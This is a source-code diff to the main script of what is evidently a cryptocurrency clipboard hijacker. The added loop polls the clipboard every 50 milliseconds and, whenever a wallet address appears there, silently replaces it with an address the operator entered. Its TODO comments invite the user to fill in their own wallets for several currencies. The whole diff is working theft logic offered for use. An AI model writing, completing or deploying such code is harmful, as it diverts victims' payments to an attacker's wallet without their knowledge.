@@ -1,6 +1,7 @@
 from controller.clipboard_controller import ClipboardController
 from controller.console_controller import ConsoleController
 from view.console_view import ConsoleView
+from time import sleep
 #TODO ENTER_YOUR_CRYPTOS
 #TODO GET FEEDBACK FROM MVC
 
@@ -9,11 +10,25 @@ ConsoleController().rich_traceback_handler()
 if __name__ == "__main__":
     ConsoleView().show_welcome_message()
 
-    ConsoleView().print_clipboard_content()                                                     #FIXME -----------------------------
-    print("======================================================")                             #FIXME         Added this
-    print("Clipboard was printed above for debug purposes! Will be removed in next versions.")  #FIXME         for debug
-    print("======================================================")                             #FIXME         purposes
-    print(ClipboardController().check_wallet_format("You_can_enter_any_wallet_here"))           #FIXME -----------------------------
+    # FIXME EVERYTHING BELOW ===========================================================================
+    ConsoleView().print_clipboard_content()                                                         
+    print("======================================================")                                 
+    print("Clipboard was printed above for debug purposes! Will be removed in next versions.")      
+    print("======================================================")                                 
+    wallet_to_check = ConsoleView().rich_input('Please enter first replacement wallet:')            
+    print(ClipboardController().check_wallet_format(wallet_to_check))                       
+    print(ClipboardController().check_wallet_format(ClipboardController().clipboard_data()))
+    while True:
+        sleep(0.05)
+        if ClipboardController().check_wallet_format(wallet_to_check) != None:
+            if ClipboardController().check_wallet_format(ClipboardController().clipboard_data()) != None:
+                ClipboardController().paste_new_data(wallet_to_check)
+            else:
+                print("Damn, it's not btc yet")
+        else:
+            exit()
+            
+    # FIXME EVERYTHING ABOVE ===========================================================================
 
     #TODO enter your address, leave blank if you don't want to use this one
     #TODO repeat step from above X times, depending on currency(-ies) you want to use
